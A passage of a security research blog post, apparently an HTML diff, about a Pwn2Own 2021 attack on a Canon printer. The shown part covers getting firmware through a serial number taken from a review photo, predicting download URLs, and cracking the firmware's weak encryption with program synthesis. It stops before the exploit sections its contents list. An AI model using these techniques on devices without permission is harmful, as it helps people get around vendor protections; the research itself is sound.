@@ -1,0 +1,977 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Pwn2Own 2021 Canon ImageCLASS MF644Cdw writeup</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="Axel '0vercl0k' Souchet">
+    <link rel="stylesheet" href="../../../../../theme/css/bootstrap.min.css" type="text/css" />
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+      .sidebar-nav {
+        padding: 9px 0;
+      }
+      .tag-1 {
+        font-size: 13pt;
+      }
+      .tag-2 {
+        font-size: 10pt;
+      }
+      .tag-2 {
+        font-size: 8pt;
+      }
+      .tag-4 {
+        font-size: 6pt;
+     }
+    </style>
+    <link href="../../../../../theme/css/bootstrap-responsive.min.css" rel="stylesheet" />
+    <link href="../../../../../theme/css/font-awesome.css" rel="stylesheet" />
+    <link href="../../../../../theme/css/pygments.css" rel="stylesheet" />
+
+    <!--[if lt IE 9]>
+      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link href="../../../../../feeds/atom.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer ATOM Feed" />
+    <link href="../../../../../feeds/rss.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer RSS Feed" />
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src='https://www.googletagmanager.com/gtag/js?id=G-MRPDMQ259W'></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-MRPDMQ259W');
+</script>
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container-fluid">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="../../../../../index.html">Diary of a reverse-engineer </a>
+          <div class="nav-collapse">
+            <ul class="nav">
+              <ul class="nav">
+                    <li><a href="../../../../../archives.html"><i class="icon-th-list"></i>Archives</a></li>
+              </ul>
+
+                <li >
+                    <a href="../../../../../category/debugging.html">
+                      <i class="icon-folder-open icon-large"></i>debugging
+                    </a>
+                </li>
+                <li class="active">
+                    <a href="../../../../../category/exploitation.html">
+                      <i class="icon-folder-open icon-large"></i>exploitation
+                    </a>
+                </li>
+                <li >
+                    <a href="../../../../../category/misc.html">
+                      <i class="icon-folder-open icon-large"></i>misc
+                    </a>
+                </li>
+                <li >
+                    <a href="../../../../../category/obfuscation.html">
+                      <i class="icon-folder-open icon-large"></i>obfuscation
+                    </a>
+                </li>
+                <li >
+                    <a href="../../../../../category/reverse-engineering.html">
+                      <i class="icon-folder-open icon-large"></i>reverse-engineering
+                    </a>
+                </li>
+
+                <li><a href="../../../../../pages/about.html">About</a></li>
+                <li><a href="../../../../../pages/presentations.html">Presentations</a></li>
+
+            </ul>
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="span9" id="content">
+<section id="content">
+        <article>
+                <header>
+                        <h1>
+                                <a href=""
+                                        rel="bookmark"
+                                        title="Permalink to Pwn2Own 2021 Canon ImageCLASS MF644Cdw writeup">
+                                        Pwn2Own 2021 Canon ImageCLASS MF644Cdw writeup
+                                </a>
+                        </h1>
+                </header>
+                <div class="entry-content">
+                <div class="well">
+<footer class="post-info">
+<span class="label">Date</span>
+<abbr class="published" title="2022-06-11T08:00:00-07:00">
+        <i class="icon-calendar"></i>Sat 11 June 2022
+</abbr>
+<span class="label">By</span>
+<a href="../../../../../author/nicolas-nk-devillers-jean-romain-jromaing-garnier-raphael-_trou_-rigo.html"><i class="icon-user"></i>Nicolas "NK" Devillers & Jean-Romain "JRomainG" Garnier & Raphaël "_trou_" Rigo</a>
+<span class="label">Category</span>
+<a href="../../../../../category/exploitation.html"><i class="icon-folder-open"></i>exploitation</a>
+
+
+<span class="label">Tags</span>
+	<a href="../../../../../tag/pwn2own-austin.html"><i class="icon-tag"></i>Pwn2Own Austin</a>
+	<a href="../../../../../tag/printers.html"><i class="icon-tag"></i>printers</a>
+	<a href="../../../../../tag/canon.html"><i class="icon-tag"></i>canon</a>
+	<a href="../../../../../tag/mf644cdw.html"><i class="icon-tag"></i>MF644Cdw</a>
+	<a href="../../../../../tag/imageclass.html"><i class="icon-tag"></i>ImageCLASS</a>
+	<a href="../../../../../tag/cve-2022-24674.html"><i class="icon-tag"></i>CVE-2022-24674</a>
+	<a href="../../../../../tag/zdi-22-516.html"><i class="icon-tag"></i>ZDI-22-516</a>
+	<a href="../../../../../tag/exploitation.html"><i class="icon-tag"></i>exploitation</a>
+	<a href="../../../../../tag/memory-corruption.html"><i class="icon-tag"></i>memory-corruption</a>
+</footer><!-- /.post-info -->                </div>
+                <h1 id="introduction">Introduction</h1>
+<p><a href="https://www.zerodayinitiative.com/blog/2021/8/11/pwn2own-austin-2021-phones-printers-nas-and-more">Pwn2Own Austin 2021</a> was announced in August 2021 and introduced new categories, including printers. Based on our previous experience with printers, we decided to go after one of the three models. Among those, the <a href="https://www.usa.canon.com/internet/portal/us/home/products/details/printers/color-laser/color-imageclass-mf644cdw">Canon ImageCLASS MF644Cdw</a> seemed like the most interesting target: previous research was limited (mostly targeting Pixma inkjet printers). Based on this, we started analyzing the firmware before even having bought the printer.</p>
+<p>Our team was composed of 3 members:</p>
+<ul>
+<li>Nicolas Devillers (<a href="https://twitter.com/nikaiw">@nikaiw</a>),</li>
+<li>Jean-Romain Garnier (<a href="https://twitter.com/JRomainG">@JRomainG</a>),</li>
+<li>Raphaël Rigo (<a href="https://twitter.com/_trou_">@_trou_</a>).</li>
+</ul>
+<p><strong>Note:</strong> This writeup is based on version 10.02 of the printer's firmware, the latest available at the time of Pwn2Own.</p>
+<div class="toc"><span class="toctitle">Table of contents:</span><ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#firmware-extraction-and-analysis">Firmware extraction and analysis</a><ul>
+<li><a href="#downloading-firmware">Downloading firmware</a><ul>
+<li><a href="#predicting-firmware-urls">Predicting firmware URLs</a></li>
+<li><a href="#firmware-types">Firmware types</a></li>
+</ul>
+</li>
+<li><a href="#decryption-black-box-attempts">Decryption: black box attempts</a><ul>
+<li><a href="#basic-firmware-extraction">Basic firmware extraction</a></li>
+<li><a href="#weak-encryption-but-how-weak">Weak encryption, but how weak?</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#hardware-first-look">Hardware: first look</a><ul>
+<li><a href="#main-board-and-serial-port">Main board and serial port</a></li>
+<li><a href="#service-mode">Service mode</a></li>
+<li><a href="#decrypting-firmware">Decrypting firmware</a><ul>
+<li><a href="#program-synthesis-approach">Program synthesis approach</a></li>
+</ul>
+</li>
+<li><a href="#exploiting-setup">Exploiting setup</a></li>
+<li><a href="#serial-port-dry-shell">Serial port: dry shell</a></li>
+</ul>
+</li>
+<li><a href="#vulnerability">Vulnerability</a><ul>
+<li><a href="#attack-surface">Attack surface</a></li>
+<li><a href="#vulnerable-function">Vulnerable function</a></li>
+<li><a href="#ntpv-functions">ntpv functions</a></li>
+</ul>
+</li>
+<li><a href="#exploitation">Exploitation</a><ul>
+<li><a href="#triggering-the-bug">Triggering the bug</a></li>
+<li><a href="#buffer-overflow">Buffer overflow</a></li>
+<li><a href="#bjnp">BJNP</a></li>
+<li><a href="#initial-poc">Initial PoC</a></li>
+</ul>
+</li>
+<li><a href="#payload">Payload</a><ul>
+<li><a href="#displaying-an-image">Displaying an image</a></li>
+<li><a href="#ftp">FTP</a></li>
+<li><a href="#file-system">File system</a></li>
+<li><a href="#putting-everything-together">Putting everything together</a></li>
+</ul>
+</li>
+<li><a href="#patch">Patch</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+</div>
+<h1 id="firmware-extraction-and-analysis">Firmware extraction and analysis</h1>
+<h2 id="downloading-firmware">Downloading firmware</h2>
+<p>The Canon website is interesting: you cannot download the firmware for a particular model without having a serial number which matches that model. This, as you might guess, is particularly annoying when you want to download a firmware for a model you do not own. Two options came to our mind:</p>
+<ul>
+<li>Finding a picture of the model in a review or listing,</li>
+<li>Finding a serial number of the same model on Shodan.</li>
+</ul>
+<p>Thankfully, the MFC644cdw was <a href="https://www.pcmag.com/reviews/canon-color-imageclass-mf644cdw">reviewed</a> in details by PCmag, and one of the pictures contained the serial number of the printer used for the review. This allowed us to download a firmware from the Canon USA <a href="https://www.usa.canon.com/internet/portal/us/home/support/details/printers/color-laser/color-imageclass-mf644cdw">website</a>. The version available online at the time on that website was <code>06.03</code>.</p>
+<h3 id="predicting-firmware-urls">Predicting firmware URLs</h3>
+<p>As a side note, once the serial number was obtained, we could download several version of the firmware, for different operating systems. For example, version <code>06.03</code> for macOS has the following filename: <code>mac-mf644-a-fw-v0603-64.dmg</code> and the associated download link is <code>https://pdisp01.c-wss.com/gdl/WWUFORedirectSerialTarget.do?id=OTUwMzkyMzJk&amp;cmp=ABR&amp;lang=EN</code>. As the URL implies, this page asks for the serial number and redirects you to the actual firmware if the serial is valid. In that case: <code>https://gdlp01.c-wss.com/gds/5/0400006275/01/mac-mf644-a-fw-v0603-64.dmg</code>.</p>
+<p>Of course, the base64 encoded <code>id</code> in the first URL is interesting: once decoded, you get the (literal string) <code>95039232d</code>, which in turn, is the hex representation of <code>40000627501</code>, which is part of the actual firmware URL!</p>
+<p>A few more examples led us to understand that the part of the URL with the single digit (<code>/5/</code> in our case) is just the last digit of the next part of the URL's path (<code>/0400006275/</code> in this example). We assume this is probably used for load balancing or another similar reason. Using this knowledge, we were able to download a <em>lot</em> of different firmware images for various models. We also found out that Canon pages for USA or Europe are not as current as the <a href="https://cweb.canon.jp/drv-upd/satera-mfp/mf644cdw-firm-win.html">Japanese page</a> which had version <code>09.01</code> at the time of writing.</p>
+<p>However, all of them lag behind the reality: the latest firmware version was <code>10.02</code>, which is actually retrieved by the printer's firmware update mechanism. <code>https://gdlp01.c-wss.com/rmds/oi/fwupdate/mf640c_740c_lbp620c_660c/contents.xml</code> gives us the actual up-to-date version.</p>
+<h3 id="firmware-types">Firmware types</h3>
+<p>A small note about firmware "types". The update XML has 3 different entries per content kind:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;contents-information&gt;</span>
+  <span class="nt">&lt;content</span> <span class="na">kind=</span><span class="s">&quot;bootable&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span> <span class="na">deliveryCount=</span><span class="s">&quot;1&quot;</span> <span class="na">version=</span><span class="s">&quot;1003&quot;</span> <span class="na">base_url=</span><span class="s">&quot;http://pdisp01.c-wss.com/gdl/WWUFORedirectSerialTarget.do&quot;</span> <span class="nt">&gt;</span>
+    <span class="nt">&lt;query</span> <span class="na">arg=</span><span class="s">&quot;id&quot;</span> <span class="na">value=</span><span class="s">&quot;OTUwMzZkMDQ5&quot;</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;query</span> <span class="na">arg=</span><span class="s">&quot;cmp&quot;</span> <span class="na">value=</span><span class="s">&quot;Z03&quot;</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;query</span> <span class="na">arg=</span><span class="s">&quot;lang&quot;</span> <span class="na">value=</span><span class="s">&quot;JA&quot;</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/content&gt;</span>
+  <span class="nt">&lt;content</span> <span class="na">kind=</span><span class="s">&quot;bootable&quot;</span> <span class="na">value=</span><span class="s">&quot;2&quot;</span> <span class="na">deliveryCount=</span><span class="s">&quot;1&quot;</span> <span class="na">version=</span><span class="s">&quot;1003&quot;</span> <span class="na">base_url=</span><span class="s">&quot;http://pdisp01.c-wss.com/gdl/WWUFORedirectSerialTarget.do&quot;</span> <span class="nt">&gt;</span>
+    <span class="nt">&lt;query</span> <span class="na">arg=</span><span class="s">&quot;id&quot;</span> <span class="na">value=</span><span class="s">&quot;OTUwMzZkMGFk&quot;</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;query</span> <span class="na">arg=</span><span class="s">&quot;cmp&quot;</span> <span class="na">value=</span><span class="s">&quot;Z03&quot;</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;query</span> <span class="na">arg=</span><span class="s">&quot;lang&quot;</span> <span class="na">value=</span><span class="s">&quot;JA&quot;</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/content&gt;</span>
+  <span class="nt">&lt;content</span> <span class="na">kind=</span><span class="s">&quot;bootable&quot;</span> <span class="na">value=</span><span class="s">&quot;3&quot;</span> <span class="na">deliveryCount=</span><span class="s">&quot;1&quot;</span> <span class="na">version=</span><span class="s">&quot;1003&quot;</span> <span class="na">base_url=</span><span class="s">&quot;http://pdisp01.c-wss.com/gdl/WWUFORedirectSerialTarget.do&quot;</span> <span class="nt">&gt;</span>
+    <span class="nt">&lt;query</span> <span class="na">arg=</span><span class="s">&quot;id&quot;</span> <span class="na">value=</span><span class="s">&quot;OTUwMzZkMTEx&quot;</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;query</span> <span class="na">arg=</span><span class="s">&quot;cmp&quot;</span> <span class="na">value=</span><span class="s">&quot;Z03&quot;</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;query</span> <span class="na">arg=</span><span class="s">&quot;lang&quot;</span> <span class="na">value=</span><span class="s">&quot;JA&quot;</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/content&gt;</span>
+</code></pre></div>
+
+
+<p>Which correspond to:</p>
+<ul>
+<li><code>gdl_MF640C_740C_LBP620C_660C_Series_MainController_TYPEA_V10.02.bin</code></li>
+<li><code>gdl_MF640C_740C_LBP620C_660C_Series_MainController_TYPEB_V10.02.bin</code></li>
+<li><code>gdl_MF640C_740C_LBP620C_660C_Series_MainController_TYPEC_V10.02.bin</code></li>
+</ul>
+<p>Each type corresponds to one of the models listed in the XML URL:</p>
+<ul>
+<li>MF640C =&gt; TYPEA</li>
+<li>MF740C =&gt; TYPEB</li>
+<li>LBP620C =&gt; TYPEC</li>
+</ul>
+<h2 id="decryption-black-box-attempts">Decryption: black box attempts</h2>
+<h3 id="basic-firmware-extraction">Basic firmware extraction</h3>
+<p>Windows updates such as <code>win-mf644-a-fw-v0603.exe</code> are Zip SFX files, which contain the actual updater: <code>mf644c_v0603_typea_w.exe</code>. This is the end of the PE file as seen in <a href="http://hiew.ru">Hiew</a>:</p>
+<div class="highlight"><pre><span></span><code>004767F0:  58 50 41 44-44 49 4E 47-50 41 44 44-49 4E 47 58  XPADDINGPADDINGX
+00072C00:  4E 43 46 57-00 00 00 00-3D 31 5D 08-20 00 00 00  NCFW    =1]
+</code></pre></div>
+
+
+<p>As you can see (the address changes from RVA to physical offset), the firmware update seems to be stored at the end of the PE as an overlay, and conveniently starts with a <code>NCFW</code> magic header. MacOS firmware updates can be extracted with 7z and contain a big file: <code>mf644c_v0603_typea_m64.app/Contents/Resources/.USTBINDDATA</code> which is almost the same as the Windows overlay except for the PE signature, and some offsets. </p>
+<p>After looking at a bunch of firmware, it became clear that the footer of the update contains information about various parts of the firmware update, including a nice <code>USTINFO.TXT</code> file which describes the target model, etc. The <code>NCFW</code> magic also appears several times in the biggest "file" described by the UST footer. After some trial and error, its format was understood and allowed us to split the firmware into its basic components.</p>
+<p>All this information was compiled into the <a href="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/unpack_fw.py">unpack_fw.py</a> script.</p>
+<h3 id="weak-encryption-but-how-weak">Weak encryption, but how weak?</h3>
+<p>The main firmware file <code>Bootable.bin.sig</code> is encrypted, but it seems encrypted with a very simple algorithm, as we can determine by looking at the patterns:</p>
+<div class="highlight"><pre><span></span><code>00000040  20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F  !&quot;#$%&amp;&#39;()*+,-./
+00000050  30 31 32 33 34 35 36 37 38 39 3A 3B 39 FC E8 7A 0123456789:;9..z
+00000060  34 35 4F 50 44 45 46 37 48 49 CA 4B 4D 4E 4F 50 45OPDEF7HI.KMNOP
+00000070  51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60 QRSTUVWXYZ[\]^_`
+</code></pre></div>
+
+
+<p>The usual assumption of having big chunks of <code>00</code> or <code>FF</code> in the plaintext firmware allows us to have different hypothesis about the potential encryption algorithm. The increasing numbers most probably imply some sort of byte counter. We then tried to combine it with some basic operations and tried to decrypt:</p>
+<ul>
+<li>A xor with a byte counter =&gt; fail</li>
+<li>A xor with counter and feedback =&gt; fail</li>
+</ul>
+<p>Attempting to use a known plaintext (where the plaintext is not <code>00</code> or <code>FF</code>) was impossible at this stage as we did not have a decrypted firmware image yet. Having a reverser in the team, the obvious next step was to try to find code which implements the decryption:</p>
+<ul>
+<li>The updater tool does not decrypt the firmware but sends it as-is =&gt; fail</li>
+<li>Check the firmware of previous models to try to find unencrypted code which
+    supports encrypted "NCFW" updates:<ul>
+<li>FAIL</li>
+<li>However, we found unencrypted firmware files with a similar structure which
+    gave use a bit of known plaintext, but did not give any real clue about the
+    solution</li>
+</ul>
+</li>
+</ul>
+<h1 id="hardware-first-look">Hardware: first look</h1>
+<h2 id="main-board-and-serial-port">Main board and serial port</h2>
+<p>Once we received the printer, we of course started dismantling it to look for interesting hardware features and ways to help us get access to the firmware.</p>
+<table>
+<tr><td><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dismantling1.jpg" /></td><td><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dismantling2.jpg"/></td></tr>
+<tr><td><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dismantling3.jpg" /></td><td><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dismantling4.jpg"/></td></tr>
+</table>
+
+<ul>
+<li>Looking at the hardware we considered these different approaches to obtain more information:</li>
+<li>An SPI is present on the mainboard, read it
+<table>
+<tr><td><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/spidump1.jpg" /></td><td><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/spidump2.jpg" /></td></tr>
+</table></li>
+<li>An Unsolder eMMC is present on the mainboard, read it</li>
+<li>Find an older model, with unencrypted firmware and simpler flash to unsolder, read, profit. Fortunately, we did not have to go further in this direction.</li>
+<li>Some printers are known to have a <a href="https://chdk.fandom.com/wiki/DryOS_PIXMA_Printer_Shell">serial port for debug</a> providing a mini shell. Find one and use it to run debug commands in order to get plaintext/memory dump (<strong>NOTE</strong> <em>of course</em> we found the serial port afterwards)
+<table>
+<tr><td><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/uart1.jpg" /></td><td><img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/uart2.jpg" /></td></tr>
+</table></li>
+</ul>
+<h2 id="service-mode">Service mode</h2>
+<p>All enterprise printers have a service mode, intended for technicians to diagnose potential problems. YouTube is a good source of info on how to enter it. On this model, the dance is a <a href="https://www.youtube.com/watch?v=eOhFyqYO9-8">bit weird</a> as one must press "invisible" buttons. Once in service mode, debug logs can be dumped on a USB stick, which creates several files:</p>
+<ul>
+<li><code>SUBLOG.TXT</code></li>
+<li><code>SUBLOG.BIN</code> is obviously <code>SUBLOG.TXT</code>, encrypted with an algorithm which exhibits the same patterns as the encrypted firmware.</li>
+</ul>
+<h2 id="decrypting-firmware">Decrypting firmware</h2>
+<h3 id="program-synthesis-approach">Program synthesis approach</h3>
+<p>At this point, this was our train of thought:</p>
+<ul>
+<li>The encryption algorithm seemed "trivial" (lots of patterns, byte by byte)</li>
+<li><code>SUBLOG.TXT</code> gave us lots of plaintext</li>
+<li>We were too lazy to find it by blackbox/reasoning</li>
+</ul>
+<p>As program synthesis has evolved quite fast in the past years, we decided to try to get a tool to synthesize the decryption algorithm for us. We of course used the known plaintext from <code>SUBLOG.TXT</code>, which can be used as constraints. <a href="https://emina.github.io/rosette">Rosette</a> seemed easy to use and well suited, so we went with that. We started following a nice <a href="https://www.cs.utexas.edu/~bornholt/post/building-synthesizer.html">tutorial</a> which worked over the integers, but gave us a bit of a headache when trying to directly convert it to <code>bitvectors</code>.</p>
+<p>However, we quickly realized that we didn't have to <code>synthesize</code> a program (for all inputs), but actually <code>solve</code> an equation where the unknown was the program which would satisfy all the constraints built using the known plaintext/ciphertext pairs. The "Essential" guide to Rosette covers this in an <a href="https://docs.racket-lang.org/rosette-guide/ch_essentials.html#%28part._sec~3asynthesize%29">example</a> for us. So we started by defining the "program" grammar and <code>crypt</code> function, which
+defines a program using the grammar, with two operands, up to 3 layers deep:</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="k">define</span> <span class="n">int8?</span> <span class="p">(</span><span class="n">bitvector</span> <span class="mi">8</span><span class="p">))</span>
+<span class="p">(</span><span class="k">define</span> <span class="p">(</span><span class="n">int8</span> <span class="n">i</span><span class="p">)</span>
+  <span class="p">(</span><span class="n">bv</span> <span class="n">i</span> <span class="n">int8?</span><span class="p">))</span>
+
+<span class="p">(</span><span class="n">define-grammar</span> <span class="p">(</span><span class="n">fast-int8</span> <span class="n">x</span> <span class="n">y</span><span class="p">)</span>  <span class="c1">; Grammar of int32 expressions over two inputs:</span>
+  <span class="p">[</span><span class="n">expr</span>
+   <span class="p">(</span><span class="n">choose</span> <span class="n">x</span> <span class="n">y</span> <span class="p">(</span><span class="n">??</span> <span class="n">int8?</span><span class="p">)</span>        <span class="c1">; &lt;expr&gt; := x | y | &lt;32-bit integer constant&gt; |</span>
+           <span class="p">((</span><span class="n">bop</span><span class="p">)</span> <span class="p">(</span><span class="n">expr</span><span class="p">)</span> <span class="p">(</span><span class="n">expr</span><span class="p">))</span>  <span class="c1">;           (&lt;bop&gt; &lt;expr&gt; &lt;expr&gt;) |</span>
+           <span class="p">((</span><span class="n">uop</span><span class="p">)</span> <span class="p">(</span><span class="n">expr</span><span class="p">)))]</span>       <span class="c1">;           (&lt;uop&gt; &lt;expr&gt;)</span>
+  <span class="p">[</span><span class="n">bop</span>
+   <span class="p">(</span><span class="n">choose</span> <span class="n">bvadd</span> <span class="n">bvsub</span> <span class="n">bvand</span>      <span class="c1">; &lt;bop&gt;  := bvadd  | bvsub | bvand |</span>
+           <span class="n">bvor</span> <span class="n">bvxor</span> <span class="n">bvshl</span>       <span class="c1">;           bvor   | bvxor | bvshl |</span>
+           <span class="n">bvlshr</span> <span class="n">bvashr</span><span class="p">)]</span>        <span class="c1">;           bvlshr | bvashr</span>
+  <span class="p">[</span><span class="n">uop</span>
+   <span class="p">(</span><span class="n">choose</span> <span class="n">bvneg</span> <span class="n">bvnot</span><span class="p">)])</span>         <span class="c1">; &lt;uop&gt;  := bvneg | bvnot</span>
+
+<span class="p">(</span><span class="k">define</span> <span class="p">(</span><span class="n">crypt</span> <span class="n">x</span> <span class="n">i</span><span class="p">)</span>
+  <span class="p">(</span><span class="n">fast-int8</span> <span class="n">x</span> <span class="n">i</span> <span class="kd">#:depth</span> <span class="mi">3</span><span class="p">))</span>
+</code></pre></div>
+
+
+<p>Once this is done, we can define the constraints, based on the known plain/encrypted pairs and their position (byte counter <code>i</code>). And then we ask Rosette for an instance of the <code>crypt</code> program which satisfies the constraints:</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="k">define</span> <span class="n">sol</span> <span class="p">(</span><span class="n">solve</span>
+  <span class="p">(</span><span class="n">assert</span>
+<span class="c1">; removing constraints speed things up</span>
+    <span class="p">(</span><span class="n">&amp;&amp;</span> <span class="p">(</span><span class="n">bveq</span> <span class="p">(</span><span class="n">crypt</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x62</span><span class="p">)</span> <span class="p">(</span><span class="n">int8</span> <span class="mi">0</span><span class="p">))</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x3d</span><span class="p">))</span>
+<span class="c1">; [...]        </span>
+        <span class="p">(</span><span class="n">bveq</span> <span class="p">(</span><span class="n">crypt</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x69</span><span class="p">)</span> <span class="p">(</span><span class="n">int8</span> <span class="mi">7</span><span class="p">))</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x3d</span><span class="p">))</span>
+        <span class="p">(</span><span class="n">bveq</span> <span class="p">(</span><span class="n">crypt</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x06</span><span class="p">)</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x16</span><span class="p">))</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x20</span><span class="p">))</span>
+        <span class="p">(</span><span class="n">bveq</span> <span class="p">(</span><span class="n">crypt</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x5e</span><span class="p">)</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x17</span><span class="p">))</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x73</span><span class="p">))</span>
+        <span class="p">(</span><span class="n">bveq</span> <span class="p">(</span><span class="n">crypt</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x5e</span><span class="p">)</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x18</span><span class="p">))</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x75</span><span class="p">))</span>
+        <span class="p">(</span><span class="n">bveq</span> <span class="p">(</span><span class="n">crypt</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#xe8</span><span class="p">)</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x19</span><span class="p">))</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x62</span><span class="p">))</span>
+<span class="c1">; [...]        </span>
+        <span class="p">(</span><span class="n">bveq</span> <span class="p">(</span><span class="n">crypt</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#xc3</span><span class="p">)</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#xe0</span><span class="p">))</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x3a</span><span class="p">))</span>
+        <span class="p">(</span><span class="n">bveq</span> <span class="p">(</span><span class="n">crypt</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#xef</span><span class="p">)</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#xff</span><span class="p">))</span> <span class="p">(</span><span class="n">int8</span> <span class="mh">#x20</span><span class="p">))</span>
+        <span class="p">)</span>
+    <span class="p">)</span>
+  <span class="p">))</span>
+
+<span class="p">(</span><span class="n">print-forms</span> <span class="n">sol</span><span class="p">)</span>
+</code></pre></div>
+
+
+<p>After running <code>racket rosette.rkt</code> and waiting for a few minutes, we get the following output:</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="nb">list</span> <span class="o">&#39;</span><span class="ss">define</span> <span class="o">&#39;</span><span class="p">(</span><span class="ss">crypt</span> <span class="ss">x</span> <span class="ss">i</span><span class="p">)</span>
+ <span class="p">(</span><span class="nb">list</span>
+  <span class="o">&#39;</span><span class="ss">bvor</span>
+  <span class="p">(</span><span class="nb">list</span> <span class="o">&#39;</span><span class="ss">bvlshr</span> <span class="o">&#39;</span><span class="p">(</span><span class="ss">bvsub</span> <span class="ss">i</span> <span class="ss">x</span><span class="p">)</span> <span class="p">(</span><span class="nb">list</span> <span class="o">&#39;</span><span class="ss">bvadd</span> <span class="p">(</span><span class="n">bv</span> <span class="mh">#x87</span> <span class="mi">8</span><span class="p">)</span> <span class="p">(</span><span class="n">bv</span> <span class="mh">#x80</span> <span class="mi">8</span><span class="p">)))</span>
+  <span class="o">&#39;</span><span class="p">(</span><span class="ss">bvsub</span> <span class="p">(</span><span class="ss">bvadd</span> <span class="ss">i</span> <span class="ss">i</span><span class="p">)</span> <span class="p">(</span><span class="ss">bvadd</span> <span class="ss">x</span> <span class="ss">x</span><span class="p">))))</span>
+</code></pre></div>
+
+
+<p>which is a valid decryption program ! But it's a bit untidy. So let's convert it to C, with a trivial simplification:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">uint8_t</span> <span class="nf">crypt</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="n">i</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint8_t</span> <span class="n">t</span> <span class="o">=</span> <span class="n">i</span><span class="o">-</span><span class="n">x</span><span class="p">;</span>
+    <span class="k">return</span> <span class="p">(((</span><span class="mi">2</span><span class="o">*</span><span class="n">t</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="p">)</span><span class="o">|</span><span class="p">((</span><span class="n">t</span><span class="o">&gt;&gt;</span><span class="p">((</span><span class="mh">0x87</span><span class="o">+</span><span class="mh">0x80</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>and compile it with <code>gcc -m32 -O2</code> using <a href="https://godbolt.org">https://godbolt.org</a> to get the optimized version:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">mov</span>     <span class="no">al</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">4</span><span class="p">]</span>
+<span class="nf">sub</span>     <span class="no">al</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">8</span><span class="p">]</span>
+<span class="nf">rol</span>     <span class="no">al</span>
+<span class="nf">ret</span>
+</code></pre></div>
+
+
